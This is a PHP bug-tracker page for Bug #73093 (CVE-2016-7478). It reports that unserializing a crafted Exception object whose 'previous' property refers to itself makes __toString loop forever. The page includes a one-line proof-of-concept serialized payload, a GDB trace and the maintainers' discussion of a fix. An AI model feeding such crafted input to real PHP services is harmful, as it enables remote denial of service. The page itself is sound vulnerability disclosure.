<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='*General Issues Bug #73093 - RDF' href='rss/bug.php?id=73093'>
        <link rel='alternate' type='application/rss+xml' title='*General Issues Bug #73093 - RSS 2.0' href='rss/bug.php?id=73093&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Bug #73093 :: Unserialize Exception object can lead to infinite loop</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=73093">Bug</a>&nbsp;#73093</th>
            <td id="summary" colspan="5">Unserialize Exception object can lead to infinite loop</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2016-09-15 15:26 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2016-11-03 03:27 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>yannayl &#x61;&#116; checkpoint &#x64;&#111;&#x74; com</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=%2AGeneral+Issues">*General Issues</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>5.6.26</td>
            <th class="details">OS:</th>
            <td></td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7478" target="_blank">2016-7478</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=73093&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=73093&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=73093&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1473953189">&nbsp;</a><strong>[2016-09-15 15:26 UTC] yannayl &#x61;&#116; checkpoint &#x64;&#111;&#x74; com</strong>
<pre class='note'>Description:
------------
Description:
------------
Crafting speacial input to unserialize may cause exception::__toString never to terminate.

If the exception &quot;previous&quot; property holds the original exception object (or any cyclic situation of that sort),
the loop in exception::__toString never terminates.

Since __toString is reachable from unserialize, this issue may lead to remote DoS.
This bug is closely related to <a href='bug.php?id=70121'>bug #70121</a>.


PoC:
----
&lt;?php
echo unserialize('O:9:&quot;exception&quot;:1:{S:19:&quot;\00Exception\00previous&quot;;r:1;}');
?&gt;

expected result: script terminates.
result: script never terminates.

Code Flow (commit 01e798fa360bcd89980d1946503a8e0f8a2fd357):
------------------------------------------------------------
Zend/zend_exceptions.c line 325: the exception object stores the 'previous' object, specified in unserialize
Zend/zend_exceptions.c line 692: there is the while loop that iterates over the chain of exceptions
Zend/zend_exceptions.c line 738: exception::__toString get's the 'previous' exception and branches back to the while loop

GDB:
----
(gdb) b zim_exception___wakeup 
Breakpoint 1 at 0x8fafe2: file /home/yannayl/sources/php-src/Zend/zend_exceptions.c, line 316.
(gdb) b zim_exception___toString 
Breakpoint 2 at 0x9008f7: file /home/yannayl/sources/php-src/Zend/zend_exceptions.c, line 677.
(gdb) r infloop.php 
Starting program: /home/yannayl/sources/php-src/sapi/cli/php infloop.php
Breakpoint 1, zim_exception___wakeup (execute_data=0x7ffff44130f0, return_value=0x7fffffff9aa0) at /home/yannayl/sources/php-src/Zend/zend_exceptions.c:316
316 {
(gdb) b 325
Breakpoint 3 at 0x8fb787: file /home/yannayl/sources/php-src/Zend/zend_exceptions.c, line 325.
(gdb) c
Continuing.
Breakpoint 3, zim_exception___wakeup (execute_data=0x7ffff44130f0, return_value=0x7fffffff9aa0) at /home/yannayl/sources/php-src/Zend/zend_exceptions.c:325
325     CHECK_EXC_TYPE(ZEND_STR_PREVIOUS, IS_OBJECT);
(gdb) n
326 }
(gdb) printzv object
[0x7ffff4413110] (refcount=3) object(Exception) #1    Hash(7)[0x7ffff4455380]: {
      [0]  =&gt; [0x7ffff445ca20] indirect: [0x7ffff4479028] (refcount=21) string: 
      [1]  =&gt; [0x7ffff445ca40] indirect: [0x7ffff4479038] (refcount=21) string: 
      [2]  =&gt; [0x7ffff445ca60] indirect: [0x7ffff4479048] long: 0
      [3]  =&gt; [0x7ffff445ca80] indirect: [0x7ffff4479058] (refcount=1) string: /home/yannayl/sources/php-src/infloop.php
      [4]  =&gt; [0x7ffff445caa0] indirect: [0x7ffff4479068] long: 3
      [5]  =&gt; [0x7ffff445cac0] indirect: [0x7ffff4479078] (refcount=1) array: 
      [6]  =&gt; [0x7ffff445cae0] indirect: [0x7ffff4479088] (refcount=3) object(Exception) #1
}
  
(gdb) c
Continuing.
Breakpoint 2, zim_exception___toString (execute_data=0x7ffff4413090, return_value=0x7fffffff9f60) at /home/yannayl/sources/php-src/Zend/zend_exceptions.c:677
677 {
(gdb) b 693
Breakpoint 4 at 0x900ac7: file /home/yannayl/sources/php-src/Zend/zend_exceptions.c, line 693.
(gdb) c
Continuing.
Breakpoint 4, zim_exception___toString (execute_data=0x7ffff4413090, return_value=0x7fffffff9f60) at /home/yannayl/sources/php-src/Zend/zend_exceptions.c:693
693         zend_string *prev_str = str;
(gdb) print exception
$1 = (zval *) 0x7ffff44130b0
(gdb) l
688 
689     exception = getThis();
690     fname = zend_string_init(&quot;gettraceasstring&quot;, sizeof(&quot;gettraceasstring&quot;)-1, 0);
691 
692     while (exception &amp;&amp; Z_TYPE_P(exception) == IS_OBJECT &amp;&amp; instanceof_function(Z_OBJCE_P(exception), zend_ce_throwable)) {
693         zend_string *prev_str = str;
694         zend_string *message = zval_get_string(GET_PROPERTY(exception, ZEND_STR_MESSAGE));
695         zend_string *file = zval_get_string(GET_PROPERTY(exception, ZEND_STR_FILE));
696         zend_long line = zval_get_long(GET_PROPERTY(exception, ZEND_STR_LINE));
697 
(gdb) c
Continuing.
Breakpoint 4, zim_exception___toString (execute_data=0x7ffff4413090, return_value=0x7fffffff9f60) at /home/yannayl/sources/php-src/Zend/zend_exceptions.c:693
693         zend_string *prev_str = str;
(gdb) p exception
$2 = (zval *) 0x7ffff4479088
(gdb) c
Continuing.
Breakpoint 4, zim_exception___toString (execute_data=0x7ffff4413090, return_value=0x7fffffff9f60) at /home/yannayl/sources/php-src/Zend/zend_exceptions.c:693
693         zend_string *prev_str = str;
(gdb) p exception
$3 = (zval *) 0x7ffff4479088
(gdb) c
Continuing.
Breakpoint 4, zim_exception___toString (execute_data=0x7ffff4413090, return_value=0x7fffffff9f60) at /home/yannayl/sources/php-src/Zend/zend_exceptions.c:693
693         zend_string *prev_str = str;
(gdb) p exception
$4 = (zval *) 0x7ffff4479088
(gdb) kill


</pre>
</div><h2>Patches</h2>
<p><a href='patch-add.php?bug_id=73093'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=73093'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_comment' ><a name="1474849516">&nbsp;</a><strong>[2016-09-26 00:25 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>I don't think it's possible to do anything about it except not writing code displaying unserializing exceptions. I could add check that previous != this, but you could as well create two exceptions for which one is previous for another, or three, or ten, and we've got back the same problem. I think the only solution for this is making exceptions not serializable: <a href="https://github.com/php/php-src/pull/1443" rel="nofollow">https://github.com/php/php-src/pull/1443</a>

but unfortunately this was not accepted, see: <a href="http://marc.info/?l=php-internals&amp;m=143798100917575&amp;w=2" rel="nofollow">http://marc.info/?l=php-internals&amp;m=143798100917575&amp;w=2</a> and following discussion. So I don't know any solution for this.
</pre>
</div><div class='comment type_comment' ><a name="1474887925">&nbsp;</a><strong>[2016-09-26 11:05 UTC] yannayl &#x61;&#116; checkpoint &#x64;&#111;&#x74; com</strong>
<pre class='note'>How about marking the exceptions already converted to string in some way and then throwing an exception or stopping the iteration when encountering already marked?

Either creating a new hash table for that or using the 'nApplyCount' of the properties table (similar to print functions)?
</pre>
</div><div class='comment type_log' ><a name="1475132148">&nbsp;</a><strong>[2016-09-29 06:55 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Summary:     Unserialize exceptoin object can lead to
              infinite loop</span>
<span class="added">+Summary:     Unserialize Exception object can lead to
              infinite loop</span>
<span class="removed">-PHP Version: 7.1.0RC1</span>
<span class="added">+PHP Version: 5.6.26</span>
</div></div></div><div class='comment type_comment' ><a name="1477909420">&nbsp;</a><strong>[2016-10-31 10:23 UTC] yannayl &#x61;&#116; checkpoint &#x64;&#111;&#x74; com</strong>
<pre class='note'>Assigned CVE: CVE-2016-7478
Please associate it with this bug.
</pre>
</div><div class='comment type_log' ><a name="1478143663">&nbsp;</a><strong>[2016-11-03 03:27 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status:      Open</span>
<span class="added">+Status:      Closed</span>
<span class="removed">-Type:        Security</span>
<span class="added">+Type:        Bug</span>
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: stas</span>
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID:      2016-7478</span>
</div></div></div><div class='comment type_comment' ><a name="1478143663">&nbsp;</a><strong>[2016-11-03 03:27 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>The fix for this bug has been committed.

Snapshots of the sources are packaged every three hours; this change
will be in the next snapshot. You can grab the snapshot at
<a href="http://snaps.php.net/" rel="nofollow">http://snaps.php.net/</a>.

 For Windows:

<a href="http://windows.php.net/snapshots/" rel="nofollow">http://windows.php.net/snapshots/</a>
 
Thank you for the report, and for helping us make PHP better.

Does not reproduce anymore, seems to be fixed.
</pre>
</div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
